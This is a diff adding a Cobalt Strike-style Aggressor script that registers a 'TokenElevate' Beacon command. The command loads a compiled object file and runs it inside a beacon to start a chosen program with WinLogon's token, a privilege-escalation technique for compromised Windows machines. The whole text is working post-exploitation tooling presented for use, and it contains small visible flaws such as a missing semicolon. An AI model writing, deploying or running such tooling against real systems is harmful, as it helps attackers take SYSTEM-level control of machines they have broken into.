@@ -1,0 +1,23 @@
+alias TokenElevate {
+	local('$handle $data $args $2');
+
+    if(size(@_) != 2){
+        berror($1, "TokenElevate: not enough arguments,Usage: TokenElevate [exe to run] ");
+        return;
+    }
+
+    $handle = openf(script_resource("TokenElevate.o"));
+    $data   = readb($handle, -1);
+    closef($handle)
+
+    $args = bof_pack($1,"Z",$2);
+
+    btask($1, "Running TokenElevate");
+
+
+    beacon_inline_execute($1,$data,"go",$args);
+}
+
+beacon_command_register(
+"TokenElevate",
+"Start a Process with WinLogon's Token");
